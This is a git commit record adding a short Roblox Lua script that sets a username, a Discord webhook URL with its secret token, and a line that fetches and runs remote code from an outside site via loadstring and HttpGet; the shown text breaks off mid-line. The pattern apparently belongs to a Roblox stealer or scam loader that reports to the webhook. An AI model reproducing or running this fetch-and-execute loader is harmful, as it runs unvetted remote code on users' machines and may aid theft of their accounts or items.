2b1d2253e82951dd1243d467605cacbd61da7eec
ScriptMaker-Glitch <krazycal2001@gmail.com>
2024-06-21 21:26:42 +0800

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,5 @@
+UserName = "blackman1589"
+
+Webhook "https://discord.com/api/v10/webhooks/1245944754126983259/anRod0KFZ2VmIk0BymxY3xMnsrvPry85JJQO1EUN_yRSolRkvz4OPRBHvdzk7xcMVwOc" 
+
+ loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua
